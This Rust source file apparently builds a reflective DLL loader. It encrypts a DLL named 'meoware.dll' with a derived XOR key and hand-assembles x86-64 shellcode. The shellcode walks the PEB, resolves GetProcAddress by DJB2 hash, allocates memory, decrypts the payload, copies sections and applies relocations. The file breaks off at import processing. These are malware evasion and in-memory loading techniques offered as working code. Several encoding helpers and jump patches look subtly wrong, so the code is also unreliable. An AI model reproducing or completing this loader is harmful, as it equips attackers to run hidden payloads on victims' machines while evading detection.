use std::{path::PathBuf, rc};


pub fn find_meoware_dll() -> Option<PathBuf> {
    let out = std::env::var("OUT_DIR").ok()?;
    let out_path = PathBuf::from(&out);
    let mut search = out_path.as_path();
    for _ in 0..5 {
        search = search.parent()?;
        let candidate = search.join("meoware.dll");
        if candidate.exists() { return Some(candidate); }
    }
    None
}

fn djb2(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &c in name {
        if c == 0 { break; }
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}


pub fn generate_reflective_shellcode(dll_bytes: &[u8], build_key: &[u8]) -> Vec<u8> {
    // Derive XOR key;
    let mut pk = [0u8; 16];
    for i in 0..16 {
        pk[i] = build_key[i % build_key.len()]
            .wrapping_add(build_key[(i + 7) % build_key.len()])
            .wrapping_mul(0x5A)
            .wrapping_add(i as u8 + 1);
        if pk[i] == 0 { pk[i] = 0x41; }
    }
    let enc: Vec<u8> = dll_bytes.iter().enumerate().map(|(i, b)| b ^ pk[i % 16]).collect();

    // Metadata header: [size:4][key:16][magic:4][pad:8] = 32 bytes
    let mut header = [0u8; 32];
    header[0..4].copy_from_slice(&(dll_bytes.len() as u32).to_le_bytes());
    header[4..20].copy_from_slice(&pk);
    header[20..24].copy_from_slice(&[0xFE, 0x11, 0x5C, 0x0D]);

    let h_gpa = djb2(b"GetProcAddress");

    // Build string table: null terminated ASCII strings after the stub
    let strings: Vec<(&str, Vec<u8>)> = vec![
        ("LoadLibraryA",   b"LoadLibraryA\0".to_vec()),
        ("VirtualAlloc",   b"VirtualAlloc\0".to_vec()),
        ("VirtualProtect", b"VirtualProtect\0".to_vec()),
    ];

    eprintln!("Hash: GetProcAddress=0x{:08X}", h_gpa);

    let (stub, str_offsets) = gen_stub(h_gpa, &strings);
    eprintln!("PIC stub: {} bytes, strings: {} bytes, DLL: {} bytes", stub.len(), str_offsets.1, enc.len());

    let mut sc = Vec::with_capacity(stub.len() + str_offsets.1 + 32 + enc.len());
    sc.extend_from_slice(&stub);
    // Sting table is already appended inside gen_stub
    // Append metadata + encrypted DLL
    sc.extend_from_slice(&header);
    sc.extend(&enc);
    sc
}

const RAX: u8 = 0;
const RCX: u8 = 1;
const RDX: u8 = 2;
const RBX: u8 = 3;
const RSP: u8 = 4;
const RBP: u8 = 5;
const RSI: u8 = 6;
const RDI: u8 = 7;
const R8 : u8 = 8;
const R9 : u8 = 9;
const R12: u8 = 12;
const R13: u8 = 13;
const R14: u8 = 14;
const R15: u8 = 15;

fn modrm(md: u8, reg: u8, rm: u8) -> u8 {
    (md << 6) | ((reg & 7) << 3) | (rm & 7)
}

// Emit REX prefix. w=64bit, r/b extend reg/rm fields
fn emit_rex(c: &mut Vec<u8>, w: bool, reg: u8, rm: u8) {
    let val = 0x40 
        | if w { 8 } else { 0 } 
        | ((reg >> 3) & 1) << 1
        | ((rm >> 3) & 1);
    if val != 0x40 || w { c.push(val) }
}

// Emit ModR/M + optional SIB + displacment for [base + disp]
fn emit_modrm_mem(c: &mut Vec<u8>, reg: u8, base: u8, disp: i32) {
    if disp == 0 && (base & 7) != 5 { // mod=00 (means no disp), except rbp/r13
        c.push(modrm(0, reg, base));
        if (base & 7) == 4 { c.push(0x24) } // SIP for rsp/r12
    } else if disp >= -128 && disp <= 127 {
        c.push(modrm(1, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.push(disp as i8 as u8);
    } else {
        c.push(modrm(2, reg, base));
        if (base & 7) == 4 { c.push(0x24) }
        c.extend_from_slice(&disp.to_le_bytes());
    }
}

// cmp r32, r32
fn cmp_rr32(c: &mut Vec<u8>, a: u8, b: u8) {
    let need_rex = a >= 8 || b >= 8;
    if need_rex { emit_rex(c, false, b, a) }
    c.push(0x39);
    c.push(modrm(3, b, a));
}

// push r64
fn push_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x50 + (reg & 7));
}

// Pop r64  
fn pop_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0x58 + (reg & 8));
}

// call r64
fn call_r(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { c.push(0x41) }
    c.push(0xFF);
    c.push(modrm(3, 2, reg))
}

// mov r64, r64
fn mov_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x89);
    c.push(modrm(3, src, dst))
}

// mov r64, [base + disp]
fn mov_rm64(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    emit_rex(c, true, dst, base);
    c.push(0x8B);
    emit_modrm_mem(c, dst, base, disp);
}

// mov r32, [base + disp] (32-bit load, zero extends to r64)
fn mov_rm32(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x8B);
    emit_modrm_mem(c, dst, base, disp);
}

// mov [base + disp], r64
fn mov_mr64(c: &mut Vec<u8>, base: u8, disp: i32, src: u8) {
    let need_rex = src >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, src, base) }
    c.push(0x89);
    emit_modrm_mem(c, src, base, disp);
}

// mov r64, imm64
fn mov_ri32(c: &mut Vec<u8>, dst: u8, imm: u32) {
    if dst >= 8 { c.push(0x41) } // REX.B
    c.push(0xB8 + (dst & 7));
    c.extend_from_slice(&imm.to_le_bytes());
}

// movzx r32, byte [base + disp]
fn movzx_rm8(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x0F);
    c.push(0xB6);
    emit_modrm_mem(c, dst, base, disp);
}

// movzx r32, word [base + disp]
fn movzx_rm16(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    let need_rex = dst >= 8 || base >= 8;
    if need_rex { emit_rex(c, false, dst, base) }
    c.push(0x0F);
    c.push(0xB7);
    emit_modrm_mem(c, dst, base, disp);
}

// inc r64
fn inc_r(c: &mut Vec<u8>, reg: u8) {
    emit_rex(c, true, 0, reg);
    c.push(0xFF);
    c.push(modrm(3, 0, reg));
}

// dec r32
fn dec_r32(c: &mut Vec<u8>, reg: u8) {
    if reg >= 8 { emit_rex(c, false, 1, reg) }
    c.push(0xFF);
    c.push(modrm(3, 1, reg));
}

// imul r32, r32, imm8
fn imul_rri8(c: &mut Vec<u8>, dst: u8, src: u8, imm: i8) {
    let need_rex = dst >= 8 || src >= 8;
    if need_rex { emit_rex(c, false, dst, src) }
    c.push(0x6B);
    c.push(modrm(3, dst, src));
    c.push(imm as u8);
}

// add r32, r32
fn add_rr32(c: &mut Vec<u8>, dst: u8, src: u8) {
    let need_rex = dst >= 8 || src >= 8;
    if need_rex { emit_rex(c, false, dst, src) }
    c.push(0x01);
    c.push(modrm(3, src, dst))
}

// lea r64, [base + disp32]
fn lea_rd(c: &mut Vec<u8>, dst: u8, base: u8, disp: i32) {
    emit_rex(c, true, dst, base);
    c.push(0x8D);
    c.push(modrm(2, dst, base));
    if (base & 7) == 4 { c.push(0x24) }
    c.extend_from_slice(&disp.to_le_bytes());
}

// add r64, r64
fn add_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x01);
    c.push(modrm(3, src, dst));
}

// add [base + disp], r64
fn add_mr(c: &mut Vec<u8>, base: u8, disp: i32, src: u8) {
    emit_rex(c, true, src, base);
    c.push(0x01);
    emit_modrm_mem(c, src, base, disp);
}

// shl r64, imm8
fn shl_ri8(c: &mut Vec<u8>, reg: u8, imm: u8) {
    emit_rex(c, true, 4, reg); // /4 = shl
    c.push(0xC1);
    c.push(modrm(3, 4, reg));
    c.push(imm);
}

// and r32, imm32
fn and_ri32(c: &mut Vec<u8>, reg: u8, imm: u32) {
    if reg >= 8 { emit_rex(c, false, 4, reg) }
    c.push(0x81);
    c.push(modrm(3, 4, reg));
    c.extend_from_slice(&imm.to_le_bytes());
}

// add r64, imm32
fn add_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
    emit_rex(c, true, 0, dst); // /0 = add
    c.push(0x81);
    c.push(modrm(3, 0, dst));
    c.extend_from_slice(&imm.to_le_bytes());
} 

// sub r64, r64
fn sub_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    emit_rex(c, true, src, dst);
    c.push(0x29);
    c.push(modrm(3, src, dst));
}

// xor r32, r32
fn xor_rr(c: &mut Vec<u8>, dst: u8, src: u8) {
    let need_rex = dst >= 8 || src >= 8;
    if need_rex { emit_rex(c, false, src, dst) }
    c.push(0x31);
    c.push(modrm(3, src, dst));
}

// test r64, r64
fn test_rr(c: &mut Vec<u8>, a: u8, b: u8) {
    emit_rex(c, true, b, a);
    c.push(0x85);
    c.push(modrm(3, b, a));
}

// test r32, r32
fn test_rr32(c: &mut Vec<u8>, a: u8, b: u8) {
    let need_rex = a >= 8 || b >= 8;
    if need_rex { emit_rex(c, false, b, a) }
    c.push(0x85);
    c.push(modrm(3, b, a));
}

// test al, al
fn test_al(c: &mut Vec<u8>) {
    c.push(0x84);
    c.push(0xC0);
}

// cmp r32, imm32
fn cmp_ri32(c: &mut Vec<u8>, reg: u8, imm: u32) {
    let need_rex = reg >= 8;
    if need_rex { emit_rex(c, false, 7, reg) }
    c.push(0x81);
    c.push(modrm(3, 7, reg));
    c.extend_from_slice(&imm.to_le_bytes());
}

// sub r64, imm32
fn sub_ri(c: &mut Vec<u8>, dst: u8, imm: i32) {
    emit_rex(c, true, 5, dst); // /5 = sub
    c.push(0x81);
    c.push(modrm(3, 5, dst));
    c.extend_from_slice(&imm.to_le_bytes());
}

// rep movsb
fn rep_movsb(c: &mut Vec<u8>) {
    c.push(0xF3);
    c.push(0xA4);
}

// ret
fn ret(c: &mut Vec<u8>) {
    c.push(0xC3);
}

// Jmp back to target address
fn jmp_back(c: &mut Vec<u8>, target: usize) {
    let offset8 = (target as i64) - (c.len() as i64 + 2);
    if offset8 >= -128 && offset8 < 128 {
        c.push(0xEB);
        c.push(offset8 as i8 as u8);
    } else {
        let offset32 = (target as i32) - (c.len() as i32 + 5);
        c.push(0xE9);
        c.extend_from_slice(&offset32.to_le_bytes());
    }
}

// Conditional jump rel32. returns patch position
fn jcc32(c: &mut Vec<u8>, cc: u8) -> usize {
    let pos = c.len();
    c.push(0x0F);
    c.push(cc);
    c.extend_from_slice(&[0, 0, 0, 0]); // placeholder
    pos
}

// Conditional jump rel8. returns patch position
fn jcc8(c: &mut Vec<u8>, cc: u8) -> usize {
    let pos = c.len();
    c.push(cc);
    c.push(0); // placeholder
    pos
}

// Patch a rel32 jump to target the current position
fn patch32(c: &mut Vec<u8>, pos: usize) {
    let target = c.len();
    let offset = (target as i32) - (pos as i32 + 6); // 2 opcode + 4 disp
    let bytes  = offset.to_le_bytes();
    c[pos + 2] = bytes[0];
    c[pos + 3] = bytes[1]; 
    c[pos + 4] = bytes[2];
    c[pos + 5] = bytes[3];
}

// Patch a rel8 jump target currnet position
fn patch8(c: &mut Vec<u8>, pos: usize) {
    let target = c.len();
    let offset = (target as i32) - (pos as i32 + 2); // 1 oppcode + 1 disp
    assert!(offset >= -128 && offset < 128, "rel8 out of range: {}", offset);
    c[pos + 1] = offset as i8 as u8;
}

/**
 * Sets up shadow space, calls, cleans up
 * Emit: sub rsp, shadow; call reg; add rsp, shadow 
 * - shadow must be >= 0x20 and 16 aligned - */
fn emit_call_with_shadow(c: &mut Vec<u8>, func_reg: u8, shadow: i32) {
    sub_ri(c, RSP, shadow);
    call_r(c, func_reg);
    add_ri(c, RSP, shadow);
}

/**
 * PIC Stub Generator
 * */
fn gen_stub(h_gpa: u32, strings: &[(&str, Vec<u8>)]) -> (Vec<u8>, (Vec<usize>, usize)) {
    let mut c: Vec<u8> = Vec::with_capacity(2048);

    // PROLOGUE
    c.extend_from_slice(&[0xE8, 0, 0, 0, 0]);           // call $+5
    pop_r(&mut c, RBX);                                 // pop rbx = address of this insn (byte 5)

    push_r(&mut c, RBP);
    mov_rr(&mut c, RBP, RSP);
    sub_ri(&mut c, RSP, 0x100); // 256 butes of locals
    push_r(&mut c, R12);
    push_r(&mut c, R13);
    push_r(&mut c, R14);
    push_r(&mut c, R15);
    push_r(&mut c, RSI);
    push_r(&mut c, RDI);

    // gs:[0x60] -> PEB -> Ldr -> InMemoryOrderModuleList
    c.extend_from_slice(
        &[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0, 0, 0]  // mov rax, gs[0x60]
    );    
    mov_rm64(&mut c, RAX, RAX, 0x18);                   // [PEB+0x18] = ldr 
    mov_rm64(&mut c, RSI, RAX, 0x20);                   // rsi = InMemoryOrderModuleList.Flink (which is the first entry)
    mov_mr64(&mut c, RBP, -0x48, RSI);                  // save the list head for the loop termination         

    // Module loop to try each loaded DLL
    let module_loop = c.len();

    // Get DllBase for this entry
    mov_rm64(&mut c, R12, RSI, 0x20);                   // r12 = DllBase
    test_rr(&mut c, R12, R12);
    let jz_skip_module = jcc32(&mut c, 0x84);           // skip if DllBase is NULL

    // Check if this module has valid MZ header
    movzx_rm16(&mut c, RAX, R12, 0);                    // ax = [base+0] (should be 0x5A4D)
    cmp_ri32(&mut c, RAX, 0x5A4D);
    let jne_skip_module = jcc32(&mut c, 0x85);          // skip if not MZ

    // Parse PE: e_lfanew -> NT header -> export dir
    mov_rm32(&mut c, RAX, R12, 0x3C);                   // eax = e_lfanew
    add_rr(&mut c, RAX, R12);                           // rax = Nt headers 
    mov_rm32(&mut c, RDX, RAX, 0x88);                   // edx = export dir RVA
    test_rr32(&mut c, RDX, RDX);                        
    let jz_skip_module2 = jcc32(&mut c, 0x84);          // Skip if no export dir

    add_rr(&mut c, RDX, R12);                           // rdx = export dir VA
    mov_mr64(&mut c, RBP, 0x040, RDX);                  // save export dir

    // Read export dir fields
    mov_rm32(&mut c, RCX, RDX, 0x18);                   // ecx = NumberOfNames
    test_rr32(&mut c, RCX, RCX);
    let jz_skip_module3 = jcc32(&mut c, 0x84);          // skip if no names

    mov_rm32(&mut c, RDI, RDX, 0x20);                   // edi = AddressOfNames RVA
    add_rr(&mut c, RDI, R12);                           // rdi = AddressOfNames VA
    mov_mr64(&mut c, RBP, -0x60, RDI);                  // save AddressOfNames VA

    // hash each name and compare it to GetProcAddress hash
    let name_loop = c.len();
    dec_r32(&mut c, RCX);

    //  name_ptr = moduel_base + AddressOfNames[eax]
    mov_rr(&mut c, RAX, RCX);                           // rax = index
    shl_ri8(&mut c, RAX, 2);                            // rax = index * 4
    add_rr(&mut c, RAX, RDI);                           // rax = &AddressOfNames[index]
    mov_rm32(&mut c, RAX, RAX, 0);                      // eax = AddressOfNames[index] RVA
    add_rr(&mut c, RAX, R12);                           // rax = name string VA

    // Hash export names iwht DJB2
    push_r(&mut c, RCX);                                // save loop counter
    push_r(&mut c, RDI);                                // save names array pointer
    push_r(&mut c, RSI);                                // save module entry pointer
    mov_rr(&mut c, R14, RAX);                           // r14 = name string (temp)
    mov_ri32(&mut c, RCX, 5381);                        // edx = DJB2 seed

    let hash_loop = c.len();
    movzx_rm8(&mut c, RAX, R14, 0);                     // eax = *14 
    test_al(&mut c);                                    // test al, al
    let js_hash_done = jcc8(&mut c, 0x74);              // jz hash_done
    imul_rri8(&mut c, RDX, RDX, 33);                    // edx *= 33
    add_rr32(&mut c, RDX, RAX);                         // edx += char
    inc_r(&mut c, R14);                                 // r14++
    jmp_back(&mut c, hash_loop);
    patch8(&mut c, js_hash_done);

    // Compare hash to GetProcAddress hash
    cmp_ri32(&mut c, RDX, h_gpa);
    pop_r(&mut c, RSI);                                 // restore module entry
    pop_r(&mut c, RDI);                                 // restore names array
    pop_r(&mut c, RCX);                                 // restore counter
    let je_found_gpa = jcc32(&mut c, 0x84);             // je -> found GetProcAddress

    // Not found, try previous name
    test_rr32(&mut c, RCX, RCX);
    let jnz_name_loop = jcc32(&mut c, 0x85);            // jnx -> try next name in the module

    // Tested all nmaes in this module, fall to next module
    // Advance to next entry 
    patch32(&mut c, jz_skip_module);
    patch32(&mut c, jne_skip_module);
    patch32(&mut c, jz_skip_module2);
    patch32(&mut c, jz_skip_module3);
    // Patch the name loop exhaustion to also come here
    // (jnz_name_loop jumps back if NOT zero; when zero, falls through here)

    mov_rm64(&mut c, RAX, RSI, 0);                      // rsi = [rsi].Flink -> next moduel entry
    // check if we have wrapped arouned to the list head
    mov_rm64(&mut c, RAX, RBP, -0x48);                  // rax = list head 
    sub_rr(&mut c, RAX, RSI);                           // rax = head - current, 0 if wrapped
    test_rr(&mut c, RAX, RAX);
    let jnz_module_loop = jcc32(&mut c, 0x85);          // if not wrapped try next module
    // Patch jnz to go back to module loop
    let ml_off = (module_loop as i32) - (jnz_module_loop as i32 + 6);
    c[jnz_module_loop + 2..jnz_module_loop + 6].copy_from_slice(&ml_off.to_le_bytes());

    // Did not find GetProcAddress in all module so exit
    let jmp_exit_1 = c.len();
    c.push(0xE9);
    c.extend_from_slice(&[0, 0, 0, 0]);                 // jmp exit (patch later)

    // GetProcAddress found
    patch32(&mut c, je_found_gpa);
    // Patch jnz_name_loop to go back to name_loop
    let nl_off = (name_loop as i32) - (jnz_name_loop as i32 + 6);
    c[jnz_name_loop + 2..jnz_name_loop + 6].copy_from_slice(&nl_off.to_le_bytes());

    // r12 = module base (the dll that has GetProcAddress which is kernel32)
    // rcx = index of the matched name
    // resolve function address: NameOrdinals[index] -> Functions[ordinal]
    mov_rm64(&mut c, RDX, RBP, -0x40);                  // rdx = export dir     
    mov_rm32(&mut c, RAX, RDX, 0x24);                   // eax = AddressOfNameOrdinals RVA
    add_rr(&mut c, RAX, R12);
    // ordinals = [rax + eax * 2]
    mov_rr(&mut c, RDI, RCX);
    shl_ri8(&mut c, RDI, 1);                            // rdi = index * 2
    add_rr(&mut c, RAX, RDI);
    movzx_rm16(&mut c, RAX, RAX, 0);                    // ax = ordinal

    // Functions[ordinal]
    mov_rm64(&mut c, RDX, RBP, -0x40);                  // read export dir again 
    mov_rm32(&mut c, RDX, RDX, 0x1C);                   // edx = AddressOfFunctions RVA
    add_rr(&mut c, RDX, R12);
    shl_ri8(&mut c, RAX, 2);                            // ordinal * 4 
    add_rr(&mut c, RAX, RDX);
    mov_rm32(&mut c, RAX, RAX, 0);                      // eax = function RVA
    add_rr(&mut c, RAX, R12);                           // rax = GetProcAddress absolute VA
    mov_rr(&mut c, R13, RAX);                           // r13 = GetProcAddress

    // Resolve APIs using GetProcAddress
    // r13 = GetProcAddress
    // r12 = kernel32 base address
    // Need: 
    //      LoadLibraryA -> r14
    //      VirtualAlloc -> [rbp-8]
    //      VirtualProtect -> [rbp-0x10]

    // String offsets will be patched after stub is complete
    // For not, emit LEA rbx relative with placeholder offsets
    let mut str_lea_patches: Vec<(usize, usize)> = Vec::new();

    for (idx, (name, _)) in strings.iter().enumerate() {
        // lea rdx, [pbx + str_offset]  (function name)
        let lea_pos = c.len();
        lea_rd(&mut c, RDX, RBX, 0);                    // placeholder disp32, will patch
        str_lea_patches.push((lea_pos, idx));

        // mov rcx, r12     (kernel32 = hModule)
        mov_rr(&mut c, RCX, R12);

        // call GetProcAddress with shadow space
        emit_call_with_shadow(&mut c, R13, 0x20);

        // save result
        match *name {
            "LoadLibraryA"   => mov_rr(&mut c, R14, RAX),
            "VirtualAlloc"   => mov_mr64(&mut c, RBP, -0x08, RAX),
            "VirtualProtect" => mov_mr64(&mut c, RBP, -0x10, RAX),
            _ => {}
        }

        // check for failer
        test_rr(&mut c, RAX, RAX);
        let jz_fail = jcc32(&mut c, 0x84);
        // Patch later to exit for now remember position
        // Actually just patch to exit at the end
        patch32(&mut c, jz_fail); // TEMPORARY: patch to current pos
        // Ill fix this properly after the exit lable known
    }

    // Locate the payload and decrypt it
    let lea_payload_pos = c.len();
    lea_rd(&mut c, RSI, RBX, 0);

    // Read metadata: [0..4]=size, [4..20]=key, [20..24]=magic, 32=enc_data
    mov_rm32(&mut c, RCX, RSI, 0);                      // eax = DLL size             
    mov_mr64(&mut c, RBP, -0x20, RCX);                  // save size
    lea_rd(&mut c, RAX, RSI, 4);                        // rax = key ptr
    mov_mr64(&mut c, RBP, -0x30, RAX);                  // save key ptr
    lea_rd(&mut c, RAX, RSI, 32);                       // rax = encrypted data ptr
    mov_mr64(&mut c, RBP, -0x38, RAX);                  // save encrypted data ptr

    // VirtualAlloc(Null, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWIRTE)
    // rcx=0, rdx=size, r8=0x3000, r9=0x04
    xor_rr(&mut c, RCX, RCX);                           // null
    mov_rr(&mut c, RDX, RCX);                           // rdx = 0...size
    mov_rm64(&mut c, RDX, RBP, -0x20);                  // rdx = dll size
    mov_ri32(&mut c, R8, 0x3000);                       // MEM_COMMIT | MEM_RESERVE
    mov_ri32(&mut c, R9, 0x04);                         // PAGE_READWRITE

    // call VirtualAlloc
    mov_rm64(&mut c, RAX, RBP, -0x08);                  // rax = VirtualAlloc
    emit_call_with_shadow(&mut c, RAX, 0x20);
    test_rr(&mut c, RAX, RAX);
    let jz_alloc1_fail = jcc32(&mut c, 0x84);           // jz exit
    mov_mr64(&mut c, RBP, -0x18, RAX);                  // save decrypt
    mov_rr(&mut c, RDI, RAX);                           // rdi = dest

    //XOR decrypt loop 
    mov_rm64(&mut c, RSI, RBP, -0x38);                  // rsi = encrypted data
    mov_rm64(&mut c, R15, RBP, -0x30);                  // r15 = key ptr
    xor_rr(&mut c, RCX, RCX);                           // eax = 0
    let decrypt_loop = c.len();
    cmp_rr32(&mut c, RCX, RDX);
    c.truncate(decrypt_loop);

    // Set up decrypt loop
    mov_rm64(&mut c, RSI, RBP, -0x38);                  // rsi = encrypted data
    mov_rm64(&mut c, R15, RBP, -0x30);                  // r15 = key ptr
    xor_rr(&mut c, RCX, RCX);                           // rcx = 0
    mov_rm32(&mut c, R8, RBP, -0x20);                   // r8d = total size

    let decrypt_loop = c.len();
    cmp_rr32(&mut c, RCX, R8);                          // cmp ecx, r8d
    let jge_decrypt_done = jcc32(&mut c, 0x8D);         // jge done

    // byte = src[rcx] ^ key[rcx & 0xF]
    movzx_rm8(&mut c, RAX, RSI, 0);                     // al = *rsi (src)
    mov_rr(&mut c, RDX, RCX);
    and_ri32(&mut c, RDX, 0x0F);                        // edx = rcx & 15
    // key_byte at [r15 + rdx]
    add_rr(&mut c, RDX, R15);
    movzx_rm8(&mut c, RDX, RDX, 0);                     // dl = key[rcx & 15]
    xor_rr(&mut c, RAX, RDX);                           // al ^= dl
    c.push(0x88);                                       // store to dest
    c.push(modrm(0, RAX, RDI));                         // mov [rdi], al
    if (RDI & 7) == 4 { c.push(0x24) }                  // SIB for rsp based

    inc_r(&mut c, RSI);
    inc_r(&mut c, RDI);
    inc_r(&mut c, RCX);
    jmp_back(&mut c, decrypt_loop);
    patch32(&mut c, jge_decrypt_done);

    // Parse PE and allocate image

    // rsi pionts to theend of encrypted data, but the decrypt buf is saved
    mov_rm64(&mut c, RSI, RBP, -0x18);                  // rsi = decrypted DLL

    // Parse PE
    mov_rm32(&mut c, RAX, RSI, 0x3C);                   // rax = e_lfanew
    add_rr(&mut c, RAX, RSI);                           // rax = NT headers
    mov_mr64(&mut c, RBP, -0x28, RAX);                  // save NT headers

    // SizeOfImage at [NT+0x50]
    mov_rm32(&mut c, RDX, RAX, 0x50);                   // edx = SizeOfImage

    // VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT| MEM_RESERVE, PAGE_READWRITE)
    push_r(&mut c, RDX);                                // save SizeOfImage
    xor_rr(&mut c, RCX, RCX);

    // rdx already has SizeOfImage
    mov_ri32(&mut c, R8, 0x3000);
    mov_ri32(&mut c, R9, 0x04);
    mov_rm64(&mut c, RAX, RBP, -0x08);
    emit_call_with_shadow(&mut c, RAX, 0x20);
    pop_r(&mut c, RDX);                                 // restore SizeOfImage
    test_rr(&mut c, RAX, RAX);
    let jz_alloc2_fail = jcc32(&mut c, 0x84);
    mov_rr(&mut c, R15, RAX);                           // r15 = image base

    // Copy headers
    mov_rm64(&mut c, RAX, RBP, -0x28);                  // rax = NT header
    mov_rm32(&mut c, RCX, RAX, 0x54);                   // ecx = SizeOfHeader
    mov_rr(&mut c, RDI, R15);                           // dest = image base
    mov_rm64(&mut c, RSI, RBP, -0x18);                  // src = raw DLL
    rep_movsb(&mut c);

    // Copy sections
    mov_rm64(&mut c, RAX, RBP, -0x28);                  // NT header 
    movzx_rm16(&mut c, RCX, RAX, 0x06);                 // cx = NumberOfSections
    movzx_rm16(&mut c, RDX, RAX, 0x14);                 // dx = SizeOfOptionalHeader
    // Fist sectino header = NT 0x18 + SizeOfOptionalHeader
    lea_rd(&mut c, RSI, RAX, 0x18);
    add_rr(&mut c, RSI, RDX);                           // rsi = first section header

    let sec_loop = c.len();
    test_rr32(&mut c, RCX, RCX);
    let jz_sec_done = jcc32(&mut c, 0x84);

    push_r(&mut c, RCX);
    push_r(&mut c, RSI);

    // SizeOfRawData at [section+0x10]
    mov_rm32(&mut c, RCX, RSI, 0x10);                   // ecx = SizeOfRawData
    test_rr32(&mut c, RCX, RCX);
    let jz_skip_sec = jcc32(&mut c, 0x74);              // jz skip

    // src = raw_dll + PointerToRawData
    mov_rm32(&mut c, RAX, RSI, 0x14);                   // eax = PointerToRawData
    mov_rm64(&mut c, RSI, RBP, -0x18);                  // rsi = raw DLL
    add_rr(&mut c, RSI, RAX);                           // src

    // dst = image_base + VirtualAddress
    mov_rm64(&mut c, RAX, RSP, 0);                      // load pushed rsi (session header) from stack
    mov_rm64(&mut c, RAX, RAX, 0x0C);                   // rax = section header (from pushed rsi)
    mov_rr(&mut c, RDI, R15);
    add_rr(&mut c, RDI, RAX);                           // dst

    // eax still hold SizeOfRawData
    rep_movsb(&mut c);

    patch8(&mut c, jz_skip_sec);

    pop_r(&mut c, RSI);        
    add_ri(&mut c, RSI, 0x28);                          // next section header (40 bytes)
    pop_r(&mut c, RCX);
    dec_r32(&mut c, RCX);
    jmp_back(&mut c, sec_loop);
    patch32(&mut c, jz_sec_done);
    
    // Process relocations

    // Delta = image_base - preferred_bae
    mov_rm64(&mut c, RAX, RBP, -0x28);                  // NT header
    mov_rm64(&mut c, RDX, RAX, 0x30);                   // preferred ImageBase
    mov_rr(&mut c, RCX, R15);                           // actual base
    sub_rr(&mut c, RCX, RDX);                           // rcx = delta
    test_rr(&mut c, RCX, RCX);
    let jz_no_reloc = jcc32(&mut c, 0x84);
    mov_mr64(&mut c, RBP, -0x40, RCX);                  // save delta 

    // Base relocation table = DataDir[5] at Nt+0xB0
    mov_rm64(&mut c, RAX, RBP, -0x28);
    mov_rm32(&mut c, RAX, RAX, 0xB0);                   // reloc table RVA
    test_rr32(&mut c, RAX, RAX);
    let jz_no_reloc2 = jcc32(&mut c, 0x84);
    add_rr(&mut c, RAX, R15);                           // reloc table VA
    mov_rr(&mut c, RSI, RAX);                           // rsi = reloc block

    let reloc_outer = c.len();
    mov_rm32(&mut c, RDX, RSI, 0x04);                   // edx = SizeOfBlock
    test_rr32(&mut c, RDX, RDX);
    let jz_reloc_done = jcc32(&mut c, 0x84);

    mov_rm32(&mut c, RAX, RSI, 0);                      // eax = PageRVA
    mov_mr64(&mut c, RBP, -0x48, RAX);                  // PageRVA

    // Number of entries = (SizeOfBlock - 8) / 2
    sub_ri(&mut c, RDX, 8);
    // shr rdx, 1: (SizeOfBlock - 8) / 2 = number of entries
    emit_rex(&mut c, true, 5, RDX);                     // REX.W
    c.push(0xD1);
    c.push(modrm(3, 5, RDX));                           // shr rdx, 1

    lea_rd(&mut c, RDI, RSI, 8);                        // rdi = entries

    let reloc_inner = c.len();
    test_rr32(&mut c, RDX, RDX);
    let jz_reloc_inner_done = jcc32(&mut c, 0x84);

    movzx_rm16(&mut c, RAX, RDI, 0);                    // ax = entry
    mov_rr(&mut c, RCX, RAX);
    shl_ri8(&mut c, RCX, 0);                            // need shr rcx, 12
    // shr ecx, 12:
    if RCX >= 8 { emit_rex(&mut c, false, 5, RCX) }
    c.push(0xC1);
    c.push(modrm(3, 5, RCX));
    c.push(12);                                         // shr ecx, 12
    // type = ecx
    and_ri32(&mut c, RAX, 0x0FFF);                      // offset = eax & 0xFFF

    // Only process IMAGE_REL_BASED_DIR64
    cmp_ri32(&mut c, RCX, 10);
    let jne_skip_reloc = jcc8(&mut c, 0x75);

    // *(u64*)(image + PageRVA + offset) += delta
    add_rr(&mut c, RAX, R15);                           // + image base
    mov_rm64(&mut c, RCX, RBP, -0x48);                  // PageRVA
    add_rr(&mut c, RAX, RCX);                           // rax = target address
    mov_rm64(&mut c, RCX, RBP, -0x40);                  // delta
    add_mr(&mut c, RAX, 0, RCX);                        // [rax] += delta

    patch8(&mut c, jne_skip_reloc);
    add_ri(&mut c, RDI, 2);                             // next entry
    dec_r32(&mut c, RDX);
    jmp_back(&mut c, reloc_inner);
    patch32(&mut c, jz_reloc_inner_done);

    // Next block: rsi += SizeOfBlock
    mov_rm32(&mut c, RAX, RSI, 0x04);                   // SizeOfBlock
    add_rr(&mut c, RSI, RAX);
    jmp_back(&mut c, reloc_outer);

    patch32(&mut c, jz_reloc_done);
    patch32(&mut c, jz_no_reloc);
    patch32(&mut c, jz_no_reloc2);

    // Proccess Imports (IAT)

    // Import directory = DataDir[1] at NT+0x90
    mov_rm64(&mut c, RAX, RBP, -0x28);
    mov_rm32(&mut c, RAX, RAX, 0x90);
    test_rr32(&mut c, RAX, RAX);
    let jz_no_import = jcc32(&mut c, 0x84);
    add_rr(&mut c, RAX, R15);
    mov_rr(&mut c, RSI, RAX);

    let import_loop = c.len();
    // Check for null descriptor: OriginalFirstThunk[+0] | Name[+0xC]
    mov_rm32(&mut c, RAX, RSI, 0);
